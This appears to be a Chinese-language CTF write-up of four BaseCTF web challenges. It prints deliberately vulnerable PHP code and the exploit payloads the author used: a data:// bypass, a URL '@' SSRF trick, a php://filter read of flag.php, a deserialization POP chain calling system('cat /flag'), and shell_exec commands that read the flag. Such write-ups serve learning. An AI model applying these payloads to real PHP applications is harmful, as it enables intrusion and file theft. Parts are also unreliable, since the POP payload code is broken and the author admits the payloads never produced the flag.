1.Aura酱的礼物
源代码
```plain
 <?php
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
$gift = $_POST['gift'];
include($gift); 
```
看到file_get_contents($pen) !== 'Aura'直接想到用data伪协议进行绕过，输入pen=data://text/plain,Aura即可绕过第一个，第二个据说是ssrf漏洞， strpos()函数查找字符串在另一字符串中第一次出现的位置。找到了就返回true ，而若传入`url=http://quan9i@127.0.0.1`,加上了@这个符号，此时依旧会访问127.0.0.1  因此直接输入&challenge=[http://jasmineaura.github.io@http://gz.imxbt.cn:20905/](http://jasmineaura.github.io@http://gz.imxbt.cn:20905/)可以绕过这个，第三个的话是⼀个include点,由于我们的flag在注释部分,我们需要将其伪协议和过滤器来进⾏ base64编码后输出php://filter/convert.base64-encode/resource=flag.php，但是不知道为什么我全部弄完了也无法输出flag，但是过程是这样的，完整pyload：

```plain
pen=data://text/plain,Aura&challenge=http://jasmineaura.github.io@http://gz.imxbt.cn:20905/&gift=php://filter/convert.base64-encode/resource=flag.php
```
2.Really EZ POP
源代码
```plain
 <?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}
class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}
class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}
class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}
if ($_POST['nature']) {
    $nature = unserialize($_POST['nature']);
} 
```
思路：__destruct调用see会触发__get,get把类当成函数调用会触发__invoke,invoke把类当成字符串调用会触发__tostring,__tortring调用eval函数执行命令，其中private变量无法在函数外调用修改，只能在类内修改定义
pyload：

```plain
 <?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = "system('cat /flag');";

class Shark
{
    private $word = 'Hello, World!';
    public function setword($m)
    {
         $this->word=$m;
    }
}

class Sea
{
    public $animal;
    
}

class Nature
{
    public $sea;

}
$a=new Nature();
$b=new Sea();
$c=new Shark();
$d=new Sink();

$a->sea=$b;
$b->animal=$c;
$c->setword($d);
echo (serialize($a));
#还是不知道为什么无法输出flag，但是思路和pyload是没错的
```
3.你听不到我的声音
源代码
```plain
 <?php
highlight_file(__FILE__);
shell_exec($_POST['cmd']); 
```
shell_exec函数执行命令无回显，本来像要使用system执行输出结果发现不行，使用重定向到1.txt就可以
先输入ls / >1.txt发现flag，再cat /flag >1.txt，然后到1.txt中找到flag
4.数学大师
直接使用脚本，本人脚本不好，一般是积累

```plain
import re
import requests

req=requests.session()
url='http://gz.imxbt.cn:20184/'

answer=0
while True:
    res=req.post(url=url,data={"answer":answer})
    print(res.text)
    regex=r"(\d*?)(.)(\d*)\?"
    match=re.search(regex,res.text)
    if match.group(2) == "+":
        answer = int(match.group(1)) + int(match.group(3))
    elif match.group(2) == "-":
        answer = int(match.group(1)) - int(match.group(3))
    elif match.group(2) == "×":
        answer = int(match.group(1)) * int(match.group(3))
    elif match.group(2) == "÷":
        answer = int(match.group(1)) // int(match.group(3))
    if "BaseCTF" in res.text:
        print(res.text)
        break
```
